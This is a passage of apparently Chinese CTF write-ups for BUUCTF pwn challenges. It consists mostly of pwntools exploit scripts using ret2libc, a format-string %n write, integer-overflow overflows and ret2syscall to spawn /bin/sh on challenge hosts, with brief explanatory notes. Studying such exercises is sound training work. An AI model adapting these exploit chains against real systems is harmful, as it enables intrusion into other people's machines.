class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#r = remote(\"\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">29957</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./pwn3\"</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn3\"</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class=\"line\">puts_addr = elf.symbols[<span class=\"string\">\"puts\"</span>]</span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">\"puts\"</span>]</span><br><span class=\"line\">encrypt = <span class=\"number\">0x4009a0</span></span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x400c83</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"Input your choice!\\n\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">'1'</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"Input your Plaintext to be encrypted\\n\"</span>)</span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*<span class=\"number\">0x58</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_addr)+p64(encrypt)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.recvline()</span><br><span class=\"line\">p.recvline()</span><br><span class=\"line\">puts=u64(p.recv(<span class=\"number\">6</span>)+<span class=\"string\">'\\x00\\x00'</span>)</span><br><span class=\"line\">log.info(<span class=\"string\">\"libc base 0x%x\"</span>,puts-libc.symbols[<span class=\"string\">'puts'</span>])</span><br><span class=\"line\">libc_base = puts-libc.symbols[<span class=\"string\">'puts'</span>]</span><br><span class=\"line\">system_addr = libc_base + libc.symbols[<span class=\"string\">'system'</span>]</span><br><span class=\"line\">bin_sh_addr = libc_base + next(libc.search(<span class=\"string\">\"/bin/sh\"</span>))</span><br><span class=\"line\">print(next(libc.search(<span class=\"string\">\"/bin/sh\"</span>)))</span><br><span class=\"line\">payload2=<span class=\"string\">b'A'</span>*<span class=\"number\">0x58</span>+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)</span><br><span class=\"line\">p.sendline(payload2)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<p>太废物了</p>\n<p>后来看了题解原来是18上面</p>\n<p>用libcsearcher</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.os=<span class=\"string\">'linux'</span></span><br><span class=\"line\"><span class=\"comment\">#context.log_level='debug'</span></span><br><span class=\"line\"></span><br><span class=\"line\">ru=<span class=\"keyword\">lambda</span> x:p.recvuntil(x)</span><br><span class=\"line\">rl=<span class=\"keyword\">lambda</span> :p.recvline()</span><br><span class=\"line\">sl=<span class=\"keyword\">lambda</span> x:p.sendline(x)</span><br><span class=\"line\">sla=<span class=\"keyword\">lambda</span> x,y:p.sendlineafter(x,y)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#r = remote(\"\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">27415</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process(\"./pwn3\")</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn3\"</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class=\"line\">puts_plt = elf.symbols[<span class=\"string\">\"puts\"</span>]</span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">\"puts\"</span>]</span><br><span class=\"line\">encrypt = <span class=\"number\">0x4009a0</span></span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x400c83</span></span><br><span class=\"line\">ret = <span class=\"number\">0x4006b9</span></span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*<span class=\"number\">0x58</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(encrypt)</span><br><span class=\"line\">sla(<span class=\"string\">\"Input your choice!\\n\"</span>,<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">ru(<span class=\"string\">\"Input your Plaintext to be encrypted\\n\"</span>)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">rl()</span><br><span class=\"line\">rl()</span><br><span class=\"line\">puts = u64(ru(<span class=\"string\">'\\n'</span>)[:<span class=\"number\">-1</span>].ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">\"puts\"</span>,puts)</span><br><span class=\"line\">print(libc)</span><br><span class=\"line\">libc_base = puts-libc.dump(<span class=\"string\">\"puts\"</span>)</span><br><span class=\"line\">log.info(<span class=\"string\">\"libc base 0x%x\"</span>,libc_base)</span><br><span class=\"line\"></span><br><span class=\"line\">system_addr = libc_base + libc.dump(<span class=\"string\">\"system\"</span>)</span><br><span class=\"line\">bin_sh_addr = libc_base + libc.dump(<span class=\"string\">\"str_bin_sh\"</span>)</span><br><span class=\"line\">payload2=<span class=\"string\">b'A'</span>*<span class=\"number\">0x58</span>+p64(ret)+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)</span><br><span class=\"line\">sl(payload2)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>这里需要注意</p>\n<p>18的ubuntu执行system会进行堆栈平衡</p>\n<p>解决办法是加ret指令</p>\n</blockquote>\n<h2 id=\"OGeek2019-babyrop（32位puts泄露）\"><a href=\"#OGeek2019-babyrop（32位puts泄露）\" class=\"headerlink\" title=\"[OGeek2019]babyrop（32位puts泄露）\"></a>[OGeek2019]babyrop（32位puts泄露）</h2><p>打通</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class=\"line\"># -*- coding:utf-8 -*-</span><br><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">context.os&#x3D;&#39;linux&#39;</span><br><span class=\"line\">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">ru&#x3D;lambda x:p.recvuntil(x)</span><br><span class=\"line\">rl&#x3D;lambda :p.recvline()</span><br><span class=\"line\">sl&#x3D;lambda x:p.sendline(x)</span><br><span class=\"line\">sla&#x3D;lambda x,y:p.sendlineafter(x,y)</span><br><span class=\"line\"></span><br><span class=\"line\">#r &#x3D; remote(&quot;&quot;)</span><br><span class=\"line\">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29517)</span><br><span class=\"line\">#p &#x3D; process(&quot;.&#x2F;pwn&quot;)</span><br><span class=\"line\">elf &#x3D; ELF(&quot;.&#x2F;pwn&quot;)</span><br><span class=\"line\">libc &#x3D; ELF(&#39;.&#x2F;libc-2.23.so&#39;)</span><br><span class=\"line\">payload &#x3D; b&#39;\\x00&#39;*7 + b&#39;\\xff&#39;</span><br><span class=\"line\">main &#x3D; 0x8048825</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">puts_plt &#x3D; elf.symbols[&#39;puts&#39;]</span><br><span class=\"line\">puts_got &#x3D; elf.got[&#39;puts&#39;]</span><br><span class=\"line\">payload2 &#x3D; b&#39;A&#39;*(0xe7+0x4) + p32(0x08048548) + p32(main) + p32(0x8049fd4)</span><br><span class=\"line\">sla(&quot;Correct\\n&quot;,payload2)</span><br><span class=\"line\">puts &#x3D; u32(p.recv(4))</span><br><span class=\"line\">log.info(&quot;libc base 0x%x&quot;,puts-libc.symbols[&#39;puts&#39;])</span><br><span class=\"line\">libc_base &#x3D; puts-libc.symbols[&#39;puts&#39;]</span><br><span class=\"line\">system_addr &#x3D; libc_base + libc.symbols[&#39;system&#39;]</span><br><span class=\"line\">bin_sh_addr &#x3D; libc_base + next(libc.search(&quot;&#x2F;bin&#x2F;sh&quot;))</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">payload3 &#x3D; b&#39;A&#39;*(0xe7+0x4) + p32(system_addr) + p32(0xdeadbeef) + p32(bin_sh_addr)</span><br><span class=\"line\">sla(&quot;Correct\\n&quot;,payload3)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"第五空间2019-决赛-PWN5（格式化字符串漏洞）\"><a href=\"#第五空间2019-决赛-PWN5（格式化字符串漏洞）\" class=\"headerlink\" title=\"[第五空间2019 决赛]PWN5（格式化字符串漏洞）\"></a>[第五空间2019 决赛]PWN5（格式化字符串漏洞）</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class=\"line\"># -*- coding:utf-8 -*-</span><br><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">context.os&#x3D;&#39;linux&#39;</span><br><span class=\"line\">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">ru&#x3D;lambda x:p.recvuntil(x)</span><br><span class=\"line\">rl&#x3D;lambda :p.recvline()</span><br><span class=\"line\">sl&#x3D;lambda x:p.sendline(x)</span><br><span class=\"line\">sla&#x3D;lambda x,y:p.sendlineafter(x,y)</span><br><span class=\"line\"></span><br><span class=\"line\">#r &#x3D; remote(&quot;&quot;)</span><br><span class=\"line\">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,27812)</span><br><span class=\"line\">#p &#x3D; process(&quot;.&#x2F;pwn&quot;)</span><br><span class=\"line\">elf &#x3D; ELF(&quot;.&#x2F;pwn&quot;)</span><br><span class=\"line\">libc &#x3D; ELF(&#39;.&#x2F;libc-2.23.so&#39;)</span><br><span class=\"line\">payload &#x3D; p32(0x804C044) + &quot;aaaa%10$n&quot;</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">#print(p.recv())</span><br><span class=\"line\">sl(b&#39;8&#39;)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"BJDCTF-2nd-r2t3\"><a href=\"#BJDCTF-2nd-r2t3\" class=\"headerlink\" title=\"[BJDCTF 2nd]r2t3\"></a>[BJDCTF 2nd]r2t3</h2><p>一开始准备\\x00发现不可以</p>\n<blockquote>\n<p>unsigned __int8:表示无符号一个字节</p>\n<p>那么这里就可以溢出了，可以看下面这个eg</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;#include&lt;stdio.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;int main()</span><br><span class=\"line\">&gt;&#123;\t</span><br><span class=\"line\">char a &#x3D; 0x100;</span><br><span class=\"line\">printf(&quot;%d\\n&quot;,a-1);</span><br><span class=\"line\">printf(&quot;%d\\n&quot;,a);</span><br><span class=\"line\">printf(&quot;%d&quot;,a+1);</span><br><span class=\"line\">&gt;&#125;</span><br><span class=\"line\">&gt;输出结果为 -1 0 1</span><br></pre></td></tr></table></figure>\n<p>为什么中间是0呢？</p>\n<p>因为char是1字节，最大为0xff也就是-1，</p>\n<p>继续加+1，就是0x100，已经超过0xff，就会丢弃，变成0</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class=\"line\"># -*- coding:utf-8 -*-</span><br><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">context.os&#x3D;&#39;linux&#39;</span><br><span class=\"line\">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">s       &#x3D; lambda data               :p.send(str(data))</span><br><span class=\"line\">sa      &#x3D; lambda delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      &#x3D; lambda data               :p.sendline(str(data))</span><br><span class=\"line\">sla     &#x3D; lambda delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       &#x3D; lambda num&#x3D;4096           :p.recv(num)</span><br><span class=\"line\">ru      &#x3D; lambda delims, drop&#x3D;True  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     &#x3D; lambda                    :p.interactive()</span><br><span class=\"line\">uu32    &#x3D; lambda data               :u32(data.ljust(4,&#39;\\0&#39;))</span><br><span class=\"line\">uu64    &#x3D; lambda data               :u64(data.ljust(8,&#39;\\0&#39;))</span><br><span class=\"line\">leak    &#x3D; lambda name,addr          :log.success(&#39;&#123;&#125; &#x3D; &#123;:#x&#125;&#39;.format(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29806)</span><br><span class=\"line\">#p &#x3D; process(&quot;.&#x2F;r2t3&quot;)</span><br><span class=\"line\">elf &#x3D; ELF(&quot;.&#x2F;r2t3&quot;)</span><br><span class=\"line\">libc &#x3D; ELF(&#39;.&#x2F;libc-2.23.so&#39;)</span><br><span class=\"line\">ret &#x3D; 0x080483be</span><br><span class=\"line\">main &#x3D; 0x804863b</span><br><span class=\"line\">system &#x3D; 0x804858b</span><br><span class=\"line\">payload &#x3D; b&#39;A&#39;*0x15  + p32(system)</span><br><span class=\"line\">payload &#x3D; payload.ljust(260,b&#39;A&#39;)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"get-started-3dsctf-2016\"><a href=\"#get-started-3dsctf-2016\" class=\"headerlink\" title=\"get_started_3dsctf_2016\"></a>get_started_3dsctf_2016</h2><blockquote>\n<p>好家伙,这题真是开眼了</p>\n</blockquote>\n<p>先说第一种方法</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class=\"line\"># -*- coding:utf-8 -*-</span><br><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">context.os&#x3D;&#39;linux&#39;</span><br><span class=\"line\">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">s       &#x3D; lambda data               :p.send(str(data))</span><br><span class=\"line\">sa      &#x3D; lambda delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      &#x3D; lambda data               :p.sendline(str(data))</span><br><span class=\"line\">sla     &#x3D; lambda delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       &#x3D; lambda num&#x3D;4096           :p.recv(num)</span><br><span class=\"line\">ru      &#x3D; lambda delims, drop&#x3D;True  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     &#x3D; lambda                    :p.interactive()</span><br><span class=\"line\">uu32    &#x3D; lambda data               :u32(data.ljust(4,&#39;\\0&#39;))</span><br><span class=\"line\">uu64    &#x3D; lambda data               :u64(data.ljust(8,&#39;\\0&#39;))</span><br><span class=\"line\">leak    &#x3D; lambda name,addr          :log.success(&#39;&#123;&#125; &#x3D; &#123;:#x&#125;&#39;.format(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,26722)</span><br><span class=\"line\">#p &#x3D; process(&quot;.&#x2F;pwn4&quot;)</span><br><span class=\"line\">elf &#x3D; ELF(&quot;.&#x2F;pwn4&quot;)</span><br><span class=\"line\">libc &#x3D; ELF(&#39;.&#x2F;libc-2.23.so&#39;)</span><br><span class=\"line\">system &#x3D; 0x80489b8</span><br><span class=\"line\">payload &#x3D; &#39;a&#39;*56</span><br><span class=\"line\">payload +&#x3D; p32(0x080489A0) + p32(0x0804E6A0)</span><br><span class=\"line\">payload +&#x3D; p32(0x308CD64F) + p32(0x195719D1)</span><br><span class=\"line\">sleep(0.1)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">print(p.recv())</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>这里主要是gets这个函数没有退出，所以需要exit来强制退出，之后读flag就行</p>\n</blockquote>\n<p>第二中 静态链接应该想到ret2syscall</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.os=<span class=\"string\">'linux'</span></span><br><span class=\"line\"><span class=\"comment\">#context.log_level='debug'</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">pop_eax_ret = <span class=\"number\">0x080b91e6</span></span><br><span class=\"line\">pop_edx_ecx_ebx_ret = <span class=\"number\">0x0806fc30</span></span><br><span class=\"line\">int_0x80 = <span class=\"number\">0x0806d7e5</span></span><br><span class=\"line\">read_addr = <span class=\"number\">0x0806E140</span></span><br><span class=\"line\">gets_addr = <span class=\"number\">0x0804F630</span></span><br><span class=\"line\">pop_ebx_ret =  <span class=\"number\">0x080481ad</span>  <span class=\"comment\">#0x080481ad : pop ebx ; ret</span></span><br><span class=\"line\">main_addr = <span class=\"number\">0x08048A20</span></span><br><span class=\"line\">bss_addr = <span class=\"number\">0x080ECD70</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">26722</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./pwn4\"</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn4\"</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">'./libc-2.23.so'</span>)</span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*<span class=\"number\">56</span> + p32(gets_addr) + p32(main_addr) + p32(bss_addr)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">sl(<span class=\"string\">b\"/bin/sh\"</span>)</span><br><span class=\"line\">payload2 = <span class=\"string\">b\"A\"</span>*<span class=\"number\">0x38</span> + p32(pop_eax_ret) + p32(<span class=\"number\">0xb</span>) + p32(pop_edx_ecx_ebx_ret) + p32(<span class=\"number\">0</span>) + p32(<span class=\"number\">0</span>)  +p32(bss_addr) + p32(int_0x80)</span><br><span class=\"line\">sl(payload2)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"ciscn-2019-en-2\"><a href=\"#ciscn-2019-en-2\" class=\"headerlink\" title=\"ciscn_2019_en_2\"></a>ciscn_2019_en_2</h2><p>原题</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.os=<span class=\"string\">'linux'</span></span><br><span class=\"line\"><span class=\"comment\">#context.log_level='debug'</span></span><br><span class=\"line\"></span><br><span class=\"line\">ru=<span class=\"keyword\">lambda</span> x:p.recvuntil(x)</span><br><span class=\"line\">rl=<span class=\"keyword\">lambda</span> :p.recvline()</span><br><span class=\"line\">sl=<span class=\"keyword\">lambda</span> x:p.sendline(x)</span><br><span class=\"line\">sla=<span class=\"keyword\">lambda</span> x,y:p.sendlineafter(x,y)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#r = remote(\"\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">29937</span>)</span><br><span 